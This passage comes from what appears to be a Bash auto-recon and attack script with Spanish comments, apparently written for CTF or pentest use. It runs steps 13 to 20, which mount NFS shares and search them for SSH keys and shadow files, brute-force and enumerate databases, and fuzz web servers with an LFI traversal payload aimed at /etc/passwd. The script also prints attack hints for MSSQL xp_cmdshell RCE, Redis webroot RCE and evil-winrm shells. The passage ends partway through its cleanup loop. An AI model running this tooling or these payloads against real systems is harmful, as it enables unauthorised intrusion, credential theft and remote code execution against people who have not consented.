                    if mount -t nfs "$IP:$_share_path" "$_nfs_mount_dir" -o nolock,timeo=10 2>/dev/null; then
                        ls -laR "$_nfs_mount_dir/" 2>&1 | tee "$LOOT_DIR/scans/nfs_contents_$(echo "$_share_path" | tr '/' '_').txt"
                        local _nfs_file_count
                        _nfs_file_count=$(find "$_nfs_mount_dir" -type f 2>/dev/null | wc -l)
                        add_finding "📂 NFS $IP:$_share_path — $_nfs_file_count archivos accesibles"
                        # Check for SSH keys
                        if find "$_nfs_mount_dir" -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null | grep -q .; then
                            add_finding "🔑 NFS: SSH KEYS encontradas en $IP:$_share_path"
                        fi
                        # Check for sensitive files
                        if find "$_nfs_mount_dir" -name 'shadow' -o -name '.bash_history' -o -name '*.conf' -o -name '*.bak' 2>/dev/null | grep -q .; then
                            add_finding "🔑 NFS: Archivos sensibles encontrados en $IP:$_share_path"
                        fi
                        umount "$_nfs_mount_dir" 2>/dev/null
                    else
                        log_warn "No se pudo montar $IP:$_share_path (permisos?)"
                    fi
                fi
            done < <(grep -P '^/' "$LOOT_DIR/scans/nfs_shares.txt" 2>/dev/null)
            rmdir "$_nfs_mount_dir" 2>/dev/null
        fi
        step_done s13
    else
        log_section "Step 13/20: NFS Enumeration"
        step_skip s13 "NFS" "puerto 2049 cerrado"
        log_warn "Port 2049 not detected — skipping."
    fi

    # -- Step 14: Database enum if DB ports open -------------------------
    if has_any_port 1433 3306 5432 1521 27017 6379; then
        log_section "Step 14/20: Database Enumeration"
        step_start s14 "DB Enum (bg)"
        mkdir -p "$LOOT_DIR/db"
        local db_cmds="echo '[*] DB Enumeration started'"
        has_port 1433 && db_cmds+="; echo '[*] MSSQL...'; nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info -Pn $IP -oN $LOOT_DIR/db/mssql.txt"
        has_port 3306 && db_cmds+="; echo '[*] MySQL...'; nmap -p3306 --script mysql-empty-password,mysql-info,mysql-enum,mysql-databases -Pn $IP -oN $LOOT_DIR/db/mysql.txt"
        has_port 5432 && db_cmds+="; echo '[*] PostgreSQL...'; nmap -p5432 --script pgsql-brute -Pn $IP -oN $LOOT_DIR/db/pgsql.txt"
        has_port 6379 && db_cmds+="; echo '[*] Redis...'; nmap -p6379 --script redis-info -Pn $IP -oN $LOOT_DIR/db/redis.txt; redis-cli -h $IP INFO 2>&1 | tee $LOOT_DIR/db/redis_info.txt; redis-cli -h $IP CONFIG GET dir 2>&1 | tee -a $LOOT_DIR/db/redis_info.txt; redis-cli -h $IP KEYS '*' 2>&1 | head -50 | tee -a $LOOT_DIR/db/redis_keys.txt"
        tmux_run "DBEnum" "$db_cmds" "$LOOT_DIR/db"
        log_ok "Database enum launched in background."
        has_port 1433 && add_finding "💡 HACK: MSSQL login → impacket-mssqlclient sa:''@$IP -windows-auth"
        has_port 1433 && add_finding "💡 HACK: MSSQL RCE → EXEC xp_cmdshell 'whoami'"
        has_port 3306 && add_finding "💡 HACK: MySQL login → mysql -h $IP -u root -p''"
        has_port 5432 && add_finding "💡 HACK: PostgreSQL → psql -h $IP -U postgres -W"
        has_port 6379 && add_finding "💡 HACK: Redis RCE → redis-cli -h $IP CONFIG SET dir /var/www/html"
        has_port 27017 && add_finding "💡 HACK: MongoDB → mongosh --host $IP --port 27017"
    else
        log_section "Step 14/20: Databases"
        step_skip s14 "Databases" "no hay puertos DB"
        log_warn "No DB ports detected — skipping."
    fi

    # -- Step 15: IMAP/POP3 enum if 143/110 open ------------------------------
    if has_any_port 143 110 993 995; then
        log_section "Step 15/20: IMAP/POP3 Enumeration"
        step_start s15 "IMAP/POP3 Enum"
        mkdir -p "$LOOT_DIR/mail"
        if has_port 143; then
            log_info "Grabbing IMAP banner (port 143)..."
            timeout 5 bash -c "echo 'A1 LOGOUT' | nc -nv $IP 143" 2>&1 | tee "$LOOT_DIR/mail/imap_banner.txt"
        fi
        if has_port 110; then
            log_info "Grabbing POP3 banner (port 110)..."
            timeout 5 bash -c "echo 'QUIT' | nc -nv $IP 110" 2>&1 | tee "$LOOT_DIR/mail/pop3_banner.txt"
        fi
        if has_any_port 143 993; then
            local imap_port="143"; has_port 993 && imap_port="993"
            nmap -p"$imap_port" --script imap-capabilities,imap-ntlm-info -Pn "$IP" \
                -oN "$LOOT_DIR/mail/nmap_imap.txt" 2>&1 | tee "$LOOT_DIR/mail/nmap_imap.txt"
            if grep -qi "Target_Name\|NetBIOS" "$LOOT_DIR/mail/nmap_imap.txt" 2>/dev/null; then
                add_finding "📧 IMAP NTLM disclosure — hostname/dominio extraído"
            fi
        fi
        add_finding "📧 Servicio de correo detectado — si tienes creds, usa [I] para leer buzones"
        step_done s15
    else
        log_section "Step 15/20: IMAP/POP3"
        step_skip s15 "IMAP/POP3" "143/110 cerrado"
        log_warn "No mail ports (143/110) detected — skipping."
    fi

    # -- Step 16: RDP / WinRM if 3389/5985/5986 open -------------------
    if has_any_port 3389 5985 5986; then
        log_section "Step 16/20: Remote Access Enumeration (RDP/WinRM)"
        step_start s16 "RDP/WinRM Enum (bg)"
        mkdir -p "$LOOT_DIR/remote"
        local rem_cmds="echo '[*] Remote Access Enum started'"
        has_port 3389 && rem_cmds+="; echo '[*] RDP Nmap...'; nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 -Pn $IP -oN $LOOT_DIR/remote/rdp_nmap.txt"
        has_any_port 5985 5986 && rem_cmds+="; echo '[*] WinRM check...'; nmap -p5985,5986 --script http-auth -Pn $IP -oN $LOOT_DIR/remote/winrm_nmap.txt"
        tmux_run "RemoteEnum" "$rem_cmds" "$LOOT_DIR/remote"
        log_ok "Remote access enum launched in background."
        has_port 3389 && add_finding "💡 HACK: RDP login → xfreerdp /u:USER /p:PASS /v:$IP /cert-ignore +clipboard"
        has_any_port 5985 5986 && add_finding "💡 HACK: WinRM shell → evil-winrm -i $IP -u USER -p PASS"
        step_done s16
    else
        log_section "Step 16/20: Remote Access"
        step_skip s16 "RDP/WinRM" "3389/5985 cerrado"
        log_warn "RDP/WinRM ports not detected — skipping."
    fi

    # -- Step 17: Banner grab for unknown/non-standard ports ------------------
    log_section "Step 17/20: Banner Grab for Unknown Ports"
    step_start s17 "Banner Grab"
    local web_ports=()
    local web_protos=()

    # Pre-detect web ports (needed for both banner exclusion and Step 18)
    # 1. Detect web ports dynamically from the deep scan output
    if [[ -f "${deep_out}.nmap" ]]; then
        while IFS= read -r line; do
            local _port _svc
            _port=$(echo "$line" | grep -oP '^\d+')
            _svc=$(echo "$line" | awk '{for(i=3;i<=NF;i++) printf "%s ", $i}')
            if [[ -n "$_port" ]]; then
                local _skip=false
                for _nwp in "${NON_WEB_PORTS[@]}"; do
                    [[ "$_port" == "$_nwp" ]] && _skip=true && break
                done
                if $_skip; then
                    log_info "Puerto $_port usa HTTP pero es un servicio no-web (WinRM/etc.) — omitido del web enum"
                    continue
                fi
                local _dup=false
                for _wp in "${web_ports[@]}"; do [[ "$_wp" == "$_port" ]] && _dup=true; done
                if ! $_dup; then
                    web_ports+=("$_port")
                    if echo "$_svc" | grep -qi "ssl\|https"; then
                        web_protos+=("https")
                    else
                        web_protos+=("http")
                    fi
                fi
            fi
        done < <(grep -P '^\d+/tcp\s+open\s+.*http' "${deep_out}.nmap" 2>/dev/null)
    fi
    # 2. Fallback: also check common web ports
    for p in "${KNOWN_WEB_PORTS[@]}"; do
        if echo "$PORTS" | grep -qw "$p"; then
            local _dup=false
            for _wp in "${web_ports[@]}"; do [[ "$_wp" == "$p" ]] && _dup=true; done
            if ! $_dup; then
                web_ports+=("$p")
                if [[ "$p" == "443" || "$p" == "8443" ]]; then
                    web_protos+=("https")
                else
                    web_protos+=("http")
                fi
            fi
        fi
    done

    # Now do the banner grab (excluding known + web ports)
    local _known_ports="21 22 25 53 80 88 110 139 143 389 443 445 636 993 995 1433 2049 3306 3389 5432 5985 5986 6379 8000 8080 8443 8888"
    local _unknown_ports=()
    IFS=',' read -ra _all_ports <<< "$PORTS"
    for _p in "${_all_ports[@]}"; do
        local _is_known=false
        for _kp in $_known_ports; do [[ "$_p" == "$_kp" ]] && _is_known=true; done
        for _wp in "${web_ports[@]}"; do [[ "$_p" == "$_wp" ]] && _is_known=true; done
        $_is_known || _unknown_ports+=("$_p")
    done
    if [[ ${#_unknown_ports[@]} -gt 0 ]]; then
        log_info "Puertos no estándar detectados: ${WHITE}${_unknown_ports[*]}${NC}"
        mkdir -p "$LOOT_DIR/banners"
        for _up in "${_unknown_ports[@]}"; do
            log_run "nc -nv -w 3 $IP $_up (banner grab)"
            local _banner
            _banner=$(timeout 5 bash -c "echo '' | nc -nv -w 3 $IP $_up" 2>&1)
            echo "$_banner" > "$LOOT_DIR/banners/port_${_up}.txt"
            if [[ -n "$_banner" ]]; then
                add_finding "🔎 Puerto $_up — banner: $(echo "$_banner" | head -1 | cut -c1-80)"
            fi
        done
    else
        log_info "Todos los puertos abiertos tienen enumeración dedicada."
    fi
    step_done s17

    # --------------------------------------------------------------------------
    # -- FASE 4: Ataques pesados (alto ancho de banda) ------------------------
    # --------------------------------------------------------------------------

    # -- Step 18: Web enum -> DYNAMIC port detection from deep scan -------------
    if [[ ${#web_ports[@]} -gt 0 ]]; then
        log_section "Step 18/20: Web Enumeration -> ${#web_ports[@]} web port(s) detected"
        step_start s18 "Web Enum (bg)"
        log_ok "Puertos web detectados: ${WHITE}${web_ports[*]}${NC}"

        # -- Pre-scan: Redirect Host Discovery (foreground) --
        for idx in "${!web_ports[@]}"; do
            local wp="${web_ports[$idx]}"
            local wproto="${web_protos[$idx]}"
            local base_url="${wproto}://${IP}"
            [[ "$wp" != "80" && "$wp" != "443" ]] && base_url="${base_url}:${wp}"

            log_info "Checking redirects for ${WHITE}$base_url${NC}..."
            local _redir_url
            _redir_url=$(curl -ksI -o /dev/null -w '%{redirect_url}' --max-time 5 "$base_url" 2>/dev/null)
            if [[ -n "$_redir_url" ]]; then
                local _redir_host
                _redir_host=$(echo "$_redir_url" | sed -E 's|https?://([^/:]+).*|\1|')
                if [[ -n "$_redir_host" ]] && [[ "$_redir_host" != "$IP" ]] && ! echo "$_redir_host" | grep -qP '^\d+\.\d+\.\d+\.\d+$'; then
                    log_ok "🔀 Redirect: ${WHITE}$base_url${NC} → ${YELLOW}$_redir_url${NC}"
                    log_ok "   Hostname: ${BOLD}$_redir_host${NC}"
                    echo "$_redir_host" >> "$LOOT_DIR/web/discovered_hostnames.txt"
                    add_finding "REDIRECT: $base_url → $_redir_url (hostname: $_redir_host)"
                    if ! grep -qP "^\s*${IP}\s.*\b${_redir_host}\b" /etc/hosts 2>/dev/null; then
                        echo ""
                        log_warn "⚠️  ${YELLOW}$_redir_host${NC} NO está en /etc/hosts"
                        read -rp "  $(echo -e "${CYAN}¿Añadir '$IP $_redir_host' a /etc/hosts? [S/n]:${NC} ")" -t 30 _add_host || _add_host="n"
                        if [[ ! "$_add_host" =~ ^[nN]$ ]]; then
                            echo "$IP    $_redir_host" | sudo tee -a /etc/hosts > /dev/null
                            log_ok "✅ Añadido: ${WHITE}$IP $_redir_host${NC}"
                            [[ -z "$DOMAIN" ]] && DOMAIN="$_redir_host" && log_info "DOMAIN = ${WHITE}$DOMAIN${NC}"
                        fi
                    else
                        log_ok "$_redir_host ya está en /etc/hosts ✅"
                    fi
                fi
            fi
        done
        echo ""

        # -- Launch parallel scans per web port --
        for idx in "${!web_ports[@]}"; do
            local wp="${web_ports[$idx]}"
            local wproto="${web_protos[$idx]}"
            local base_url="${wproto}://${IP}"
            [[ "$wp" != "80" && "$wp" != "443" ]] && base_url="${base_url}:${wp}"
            local wp_suffix=""
            [[ ${#web_ports[@]} -gt 1 ]] && wp_suffix="_port${wp}"

            log_info "Lanzando scans para: ${WHITE}$base_url${NC}"

            curl -sk --max-time 5 "${base_url}/robots.txt" 2>/dev/null > "$LOOT_DIR/web/robots${wp_suffix}.txt"
            curl -sk --max-time 5 "${base_url}/sitemap.xml" 2>/dev/null > "$LOOT_DIR/web/sitemap${wp_suffix}.xml"
            if [[ -s "$LOOT_DIR/web/robots${wp_suffix}.txt" ]] && ! grep -qi "404\|not found" "$LOOT_DIR/web/robots${wp_suffix}.txt" 2>/dev/null; then
                add_finding "📄 robots.txt encontrado en puerto $wp — revisar rutas ocultas"
                grep -i "Disallow:" "$LOOT_DIR/web/robots${wp_suffix}.txt" 2>/dev/null | head -5
            fi
            if [[ -s "$LOOT_DIR/web/sitemap${wp_suffix}.xml" ]] && ! grep -qi "404\|not found" "$LOOT_DIR/web/sitemap${wp_suffix}.xml" 2>/dev/null; then
                add_finding "📄 sitemap.xml encontrado en puerto $wp"
            fi

            local wl="${WORDLIST_MEDIUM}"
            local wl2="/usr/share/wordlists/dirb/common.txt"
            [[ ! -f "$wl2" ]] && wl2="/usr/share/seclists/Discovery/Web-Content/common.txt"

            # -- FASE QUICK: common.txt (~4.6K palabras) -> termina en ~2 min --
            local _gb_cmd="echo '[*] WhatWeb...'; whatweb --no-errors --color=NEVER -a 3 '$base_url' 2>&1 | tee $LOOT_DIR/web/whatweb${wp_suffix}.txt;"
            if [[ -n "$wl2" && -f "$wl2" ]]; then
                _gb_cmd+=" echo '[*] Gobuster QUICK (common.txt -> ~2 min)...'; gobuster dir -u '$base_url' -w '$wl2' -x php,html,txt,asp,aspx,bak -t 50 --no-error -k --exclude-length 0 -o $LOOT_DIR/web/gobuster${wp_suffix}.txt 2>&1;"
            else
                _gb_cmd+=" touch $LOOT_DIR/web/gobuster${wp_suffix}.txt;"
            fi
            _gb_cmd+=" echo '[+] Quick web enum completado.'"
            tmux_run "WebEnum${wp_suffix}" "$_gb_cmd" \
                "$LOOT_DIR/web/gobuster${wp_suffix}.txt"

            # -- FASE DEEP: wordlist completa -> corre libre en background --
            if [[ -n "$wl" && -f "$wl" ]]; then
                tmux_run "GobusterDeep${wp_suffix}" \
                    "echo '[*] Gobuster DEEP (background libre)...'; \
                     gobuster dir -u '$base_url' -w '$wl' -x php,html,txt,asp,aspx,bak -t 50 --no-error -k --exclude-length 0 -o $LOOT_DIR/web/gobuster_deep${wp_suffix}.txt 2>&1; \
                     echo '[+] Gobuster DEEP completado.'" \
                    "$LOOT_DIR/web/gobuster_deep${wp_suffix}.txt"
            fi

            local _nik_ssl=""
            [[ "$wproto" == "https" ]] && _nik_ssl="-ssl"
            
            tmux_run "Nikto${wp_suffix}" \
                "echo '[*] Nikto escaneando $IP puerto $wp (max 15 min)...'; \
                 nikto -h '$IP' -port '$wp' $_nik_ssl -ask no -maxtime $NIKTO_MAXTIME -timeout 10 -Format txt -output $LOOT_DIR/web/nikto${wp_suffix}.txt 2>&1; \
                 [[ -f $LOOT_DIR/web/nikto${wp_suffix}.txt.txt ]] && mv $LOOT_DIR/web/nikto${wp_suffix}.txt.txt $LOOT_DIR/web/nikto${wp_suffix}.txt 2>/dev/null; \
                 echo '[+] Nikto completado. Resultados en nikto${wp_suffix}.txt'" \
                "$LOOT_DIR/web/nikto${wp_suffix}.txt"

            if command -v nuclei &>/dev/null; then
                tmux_run "Nuclei${wp_suffix}" \
                    "echo '[*] Nuclei escaneando $base_url...'; \
                     nuclei -u '$base_url' -severity medium,high,critical -o $LOOT_DIR/web/nuclei${wp_suffix}.txt 2>&1; \
                     echo '[+] Nuclei completado.'" \
                    "$LOOT_DIR/web/nuclei${wp_suffix}.txt"
            fi

            if command -v ffuf &>/dev/null; then
                local _lfi_wl="/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
                [[ ! -f "$_lfi_wl" ]] && _lfi_wl="/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
                [[ ! -f "$_lfi_wl" ]] && _lfi_wl="/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"
                local _param_wl="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
                [[ ! -f "$_param_wl" ]] && _param_wl="/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt"
                local _has_ffuf_wl=false
                local _ffuf_cmd="echo '[*] ffuf LFI fuzzing en $base_url...';"
                if [[ -f "$_lfi_wl" ]]; then
                    _has_ffuf_wl=true
                    _ffuf_cmd+=" echo '[*] ffuf LFI paths...'; ffuf -u '${base_url}/FUZZ' -w '$_lfi_wl' -mc 200 -ac -t 30 -fs 0 2>&1 | tee $LOOT_DIR/web/ffuf_lfi${wp_suffix}.txt;"
                fi
                if [[ -f "$_param_wl" ]]; then
                    _has_ffuf_wl=true
                    _ffuf_cmd+=" echo '[*] ffuf parameter discovery (LFI payload)...'; ffuf -u '${base_url}/index.php?FUZZ=....//....//....//....//etc/passwd' -w '$_param_wl' -mc 200 -ac -t 30 -fs 0 2>&1 | tee $LOOT_DIR/web/ffuf_params${wp_suffix}.txt;"
                fi
                _ffuf_cmd+=" echo '[+] ffuf completado.'"
                if $_has_ffuf_wl; then
                    tmux_run "FFUF${wp_suffix}" "$_ffuf_cmd" \
                        "$LOOT_DIR/web/ffuf_lfi${wp_suffix}.txt"
                else
                    log_warn "ffuf: No se encontraron wordlists LFI (SecLists) -> saltando"
                    echo "# No LFI wordlists found" > "$LOOT_DIR/web/ffuf_lfi${wp_suffix}.txt"
                fi
            fi

            if $USE_FEROX && command -v feroxbuster &>/dev/null && [[ -n "$wl" && -f "$wl" ]]; then
                tmux_run "Ferox${wp_suffix}" \
                    "echo '[*] Feroxbuster recursivo en $base_url...'; \
                     feroxbuster -u '$base_url' -w '$wl' \
                     -x php,html,txt,asp,aspx,bak \
                     -t 50 -k -q -d 2 --filter-status 403 \
                     -o $LOOT_DIR/web/feroxbuster${wp_suffix}.txt 2>&1; \
                     echo '[+] Feroxbuster completado.'" \
                    "$LOOT_DIR/web/feroxbuster${wp_suffix}.txt"
            fi

            if [[ -n "$DOMAIN" ]] && command -v gobuster &>/dev/null; then
                local _vhost_wl="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
                [[ ! -f "$_vhost_wl" ]] && _vhost_wl="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
                if [[ -f "$_vhost_wl" ]]; then
                    tmux_run "VHost${wp_suffix}" \
                        "echo '[*] VHost enum contra $DOMAIN...'; \
                         gobuster vhost -u '$base_url' -w '$_vhost_wl' --domain '$DOMAIN' --append-domain -t 50 -k -o $LOOT_DIR/web/vhosts${wp_suffix}.txt 2>&1; \
                         echo '[+] VHost completado.'" \
                        "$LOOT_DIR/web/vhosts${wp_suffix}.txt"
                fi
            fi

            log_ok "Web target: ${WHITE}$base_url${NC} — scans lanzados en paralelo"

            if [[ $idx -eq 0 ]]; then
                detect_cms "$base_url"
                if [[ "$CMS_DETECTED" == "WordPress" ]] && command -v wpscan &>/dev/null; then
                    log_info "🎯 WordPress detectado → Lanzando wpscan..."
                    tmux_run "WPScan${wp_suffix}" \
                        "echo '[*] wpscan enumerando plugins, temas y usuarios...'; \
                         wpscan --url '$base_url' --enumerate vp,vt,u --plugins-detection aggressive \
                         --no-banner -o $LOOT_DIR/web/wpscan${wp_suffix}.txt 2>&1; \
                         echo '[+] wpscan completado.'" \
                        "$LOOT_DIR/web/wpscan${wp_suffix}.txt"
                fi
            fi
        done
    else
        log_section "Step 18/20: Web Enumeration"
        step_skip s18 "Web" "no hay puertos web"
        log_warn "No web ports detected — skipping web enum."
    fi

    # -- Step 19: Vuln scan in tmux background ---------------------------------
    log_section "Step 19/20: Vuln Scan (background tmux)"
    step_start s19 "VulnScan (bg)"
    tmux_run "VulnScan" \
        "nmap -p$PORTS -sV --script vuln,auth -Pn $IP -oN $LOOT_DIR/scans/vulns.txt" \
        "$LOOT_DIR/scans/vulns.txt"

    # --------------------------------------------------------------------------
    # -- FASE 5: Cierre -------------------------------------------------------
    # --------------------------------------------------------------------------

    # -- Step 20: Wait for background scans to finish ------------------------
    step_done s19
    log_section "Step 20/20: Waiting for background scans to finish..."
    step_start s20 "Wait + Parse"
    log_info "Gobuster, Nikto, Vuln Scan y otros están corriendo en tmux."
    log_info "Puedes ver su progreso: ${WHITE}tmux attach -t $TMUX_SESSION${NC}"
    log_info "Timeout máximo: ${WHITE}10 minutos${NC}. Si se pasa, continúa con los datos disponibles."
    echo ""

    # Build list of expected output files from background tasks
    # IMPORTANT: Don't rely on tmux windows (they close after completion)
    # or status files (they may have been overwritten). Instead, predict
    # expected files from the web ports we know were scanned, and check
    # if they exist + have content + are stable (not still being written).
    local -a _expected_files=()
    local -a _expected_names=()

    # VulnScan — always expected if ports were found
    if [[ -n "$PORTS" ]]; then
        _expected_files+=("$LOOT_DIR/scans/vulns.txt")
        _expected_names+=("VulnScan")
    fi

    # WebEnum -> predict files based on web_ports array built in Step 18
    if [[ ${#web_ports[@]} -gt 0 ]]; then
        for _wi in "${!web_ports[@]}"; do
            local _wp="${web_ports[$_wi]}"
            local _wsuf=""
            [[ ${#web_ports[@]} -gt 1 ]] && _wsuf="_port${_wp}"
            if [[ "${USE_GB:-true}" == "true" ]]; then
                _expected_files+=("$LOOT_DIR/web/gobuster${_wsuf}.txt")
                _expected_names+=("Gobuster${_wsuf:- (port $_wp)}")
            fi
            
            _expected_files+=("$LOOT_DIR/web/nikto${_wsuf}.txt")
            _expected_names+=("Nikto${_wsuf:- (port $_wp)}")
            
            # Feroxbuster si está instalado y seleccionado
            if [[ "${USE_FEROX:-true}" == "true" ]] && command -v feroxbuster &>/dev/null; then
                _expected_files+=("$LOOT_DIR/web/feroxbuster${_wsuf}.txt")
                _expected_names+=("Feroxbuster${_wsuf:- (port $_wp)}")
            fi
            # ffuf LFI — trackear si ffuf esta instalado y el archivo existe
            if command -v ffuf &>/dev/null && [[ -f "$LOOT_DIR/web/ffuf_lfi${_wsuf}.txt" ]]; then
                _expected_files+=("$LOOT_DIR/web/ffuf_lfi${_wsuf}.txt")
                _expected_names+=("FFUF-LFI${_wsuf:- (port $_wp)}")
            fi
            # Nuclei si esta instalado
            if command -v nuclei &>/dev/null; then
                _expected_files+=("$LOOT_DIR/web/nuclei${_wsuf}.txt")
                _expected_names+=("Nuclei${_wsuf:- (port $_wp)}")
            fi
        done
    fi

    # SMB -> trackear todos los outputs del Step 7
    if echo ",$PORTS," | grep -qP ',(139|445),'; then
        _expected_files+=("$LOOT_DIR/smb/nmap_smb.txt")
        _expected_names+=("SMB-Nmap")
        _expected_files+=("$LOOT_DIR/smb/enum4linux.txt")
        _expected_names+=("SMB-enum4linux")
        _expected_files+=("$LOOT_DIR/smb/smbmap.txt")
        _expected_names+=("SMB-smbmap")
        if command -v $NXC &>/dev/null; then
            _expected_files+=("$LOOT_DIR/smb/nxc_shares.txt")
            _expected_names+=("SMB-NXC")
        fi
    fi

    # LDAP/AD -> expected if 389/636/88 was open
    if has_any_port 389 636 88; then
        _expected_files+=("$LOOT_DIR/ldap/ldapsearch.txt")
        _expected_names+=("LDAP")
        if has_port 88 && command -v impacket-GetNPUsers &>/dev/null && [[ -n "$DOMAIN" ]]; then
            _expected_files+=("$LOOT_DIR/ldap/asrep_hashes.txt")
            _expected_names+=("AS-REP Roast")
        fi
    fi

    # SNMP -> expected if 161/udp was open
    if [[ -n "$PORTS_UDP" ]] && echo ",$PORTS_UDP," | grep -q ",161,"; then
        _expected_files+=("$LOOT_DIR/scans/snmpwalk.txt")
        _expected_names+=("SNMP-walk")
    fi

    # DB -> expected per detected database port
    if has_port 1433; then
        _expected_files+=("$LOOT_DIR/db/mssql.txt")
        _expected_names+=("DB-MSSQL")
    fi
    if has_port 3306; then
        _expected_files+=("$LOOT_DIR/db/mysql.txt")
        _expected_names+=("DB-MySQL")
    fi
    if has_port 5432; then
        _expected_files+=("$LOOT_DIR/db/pgsql.txt")
        _expected_names+=("DB-PostgreSQL")
    fi
    if has_port 6379; then
        _expected_files+=("$LOOT_DIR/db/redis.txt")
        _expected_names+=("DB-Redis")
    fi

    # Remote access -> expected if RDP/WinRM open
    if has_port 3389; then
        _expected_files+=("$LOOT_DIR/remote/rdp_nmap.txt")
        _expected_names+=("RDP-Nmap")
    fi
    if has_any_port 5985 5986; then
        _expected_files+=("$LOOT_DIR/remote/winrm_nmap.txt")
        _expected_names+=("WinRM-Nmap")
    fi

    if [[ ${#_expected_files[@]} -eq 0 ]]; then
        log_info "No hay tareas background pendientes."
    else
        log_info "Esperando ${#_expected_files[@]} archivo(s) de resultados:"
        for _ei in "${!_expected_names[@]}"; do
            log_info "  → ${_expected_names[$_ei]}: $(basename "${_expected_files[$_ei]}")"
        done
        echo ""

        # Wait loop: check for files to exist AND be stable (not growing)
        local _wait_count=0
        local _max_wait=$BG_WAIT_MAX
        local -A _file_sizes=()

        while (( _wait_count < _max_wait )); do
            local _all_ready=true
            local _status_line=""

            for _fi in "${!_expected_files[@]}"; do
                local _f="${_expected_files[$_fi]}"
                local _n="${_expected_names[$_fi]}"
                
                # Determine tmux window name for this task
                local _wname=""
                if [[ "$_n" =~ Gobuster ]]; then
                    _wname="WebEnum${_n#Gobuster}"
                    _wname="${_wname% (*}"  # strip " (port N)" suffix
                elif [[ "$_n" =~ Nikto ]]; then
                    _wname="Nikto${_n#Nikto}"
                    _wname="${_wname% (*}"
                elif [[ "$_n" =~ FFUF ]]; then
                    _wname="FFUF${_n#FFUF-LFI}"
                    _wname="${_wname% (*}"
                elif [[ "$_n" =~ Nuclei ]]; then
                    _wname="Nuclei${_n#Nuclei}"
                    _wname="${_wname% (*}"
                elif [[ "$_n" =~ Ferox ]]; then
                    _wname="Ferox${_n#Feroxbuster}"
                    _wname="${_wname% (*}"
                elif [[ "$_n" =~ VulnScan ]]; then
                    _wname="VulnScan"
                elif [[ "$_n" == "SMB-Nmap" ]]; then
                    _wname="SMBEnum"
                elif [[ "$_n" == "SMB-enum4linux" ]]; then
                    _wname="SMBEnum"
                elif [[ "$_n" == "SMB-smbmap" ]]; then
                    _wname="SMBEnum"
                elif [[ "$_n" == "SMB-NXC" ]]; then
                    _wname="NXC-SMB"
                elif [[ "$_n" == "LDAP" ]]; then
                    _wname="LDAPEnum"
                elif [[ "$_n" == "AS-REP Roast" ]]; then
                    _wname="ASREProast"
                elif [[ "$_n" == "SNMP-walk" ]]; then
                    _wname="SNMPEnum"
                elif [[ "$_n" =~ DB- ]]; then
                    _wname="DBEnum"
                elif [[ "$_n" == "RDP-Nmap" || "$_n" == "WinRM-Nmap" ]]; then
                    _wname="RemoteEnum"
                fi
                
                local _is_alive=false
                if [[ -n "$_wname" ]] && tmux has-session -t "${TMUX_SESSION}:${_wname}" 2>/dev/null; then
                    _is_alive=true
                fi

                local _cur_size=0
                [[ -f "$_f" ]] && _cur_size=$(stat -c%s "$_f" 2>/dev/null || echo 0)
                _file_sizes[$_f]="$_cur_size"

                if [[ "$_is_alive" == true ]]; then
                    _all_ready=false
                    # Show progress
                    if [[ "$_n" =~ Gobuster ]]; then
                        local _progress=""
                        _progress=$(tmux capture-pane -t "${TMUX_SESSION}:${_wname}" -p 2>/dev/null | grep -oP 'Progress:.*\(\K[0-9.]+%' | tail -1)
                        local _lines=0
                        [[ -f "$_f" ]] && _lines=$(wc -l < "$_f" 2>/dev/null || echo 0)
                        _status_line+="  ⏳ $_n (${_progress:-esperando...} — ${_lines} dirs)"
                    elif [[ "$_n" =~ Nikto ]]; then
                        local _lines=0
                        [[ -f "$_f" ]] && _lines=$(wc -l < "$_f" 2>/dev/null || echo 0)
                        _status_line+="  ⏳ $_n (${_lines} findings...)"
                    else
                        _status_line+="  ⏳ $_n ($((_cur_size/1024))KB...)"
                    fi
                else
                    # Task is dead/completed — check file to classify result
                    local _fsize=0
                    [[ -f "$_f" ]] && _fsize=$(stat -c%s "$_f" 2>/dev/null || echo 0)
                    if (( _fsize > 50 )); then
                        _status_line+="  ✅ $_n (completado)"
                    elif [[ -f "$_f" ]]; then
                        _status_line+="  ⚪ $_n (vacio — sin resultados)"
                    else
                        _status_line+="  ❌ $_n (no generado)"
                    fi
                fi
            done

            # If all files ready (stable) → done
            if [[ "$_all_ready" == true ]]; then
                log_ok "Todos los scans completados y archivos estables."
                break
            fi

            ((_wait_count++))
            # Show progress every 10s
            if (( _wait_count % 10 == 0 )); then
                local _mins=$(( _wait_count / 60 ))
                local _secs=$(( _wait_count % 60 ))
                printf "\r\033[2K  ${DIM}[%dm %02ds]${NC} %s  " "$_mins" "$_secs" "$_status_line"
            fi
            sleep 1
        done

        if (( _wait_count >= _max_wait )); then
            echo ""
            log_warn "Timeout de 10 min alcanzado. Los escaneos en background aun corren."
            read -rp "  $(echo -e "${LRED}¿Deseas MATAR los procesos restantes para liberar CPU de la maquina? [S/n]:${NC} ")" -t 30 _kill_bg || _kill_bg="n"
            if [[ "$_kill_bg" =~ ^[sSyY]$ ]]; then
                log_info "Cerrando sesiones tmux huerfanas..."
                for _fi in "${!_expected_files[@]}"; do
                    local _n="${_expected_names[$_fi]}"
                    local _wname=""
                    if [[ "$_n" =~ Gobuster ]]; then _wname="WebEnum${_n#Gobuster}"; _wname="${_wname% (*}";
                    elif [[ "$_n" =~ Nikto ]]; then _wname="Nikto${_n#Nikto}"; _wname="${_wname% (*}";
                    elif [[ "$_n" =~ FFUF ]]; then _wname="FFUF${_n#FFUF-LFI}"; _wname="${_wname% (*}";
                    elif [[ "$_n" =~ Nuclei ]]; then _wname="Nuclei${_n#Nuclei}"; _wname="${_wname% (*}";
                    elif [[ "$_n" =~ Ferox ]]; then _wname="Ferox${_n#Feroxbuster}"; _wname="${_wname% (*}";
                    elif [[ "$_n" =~ VulnScan ]]; then _wname="VulnScan";
                    elif [[ "$_n" == "SMB-Nmap" || "$_n" == "SMB-enum4linux" || "$_n" == "SMB-smbmap" ]]; then _wname="SMBEnum";
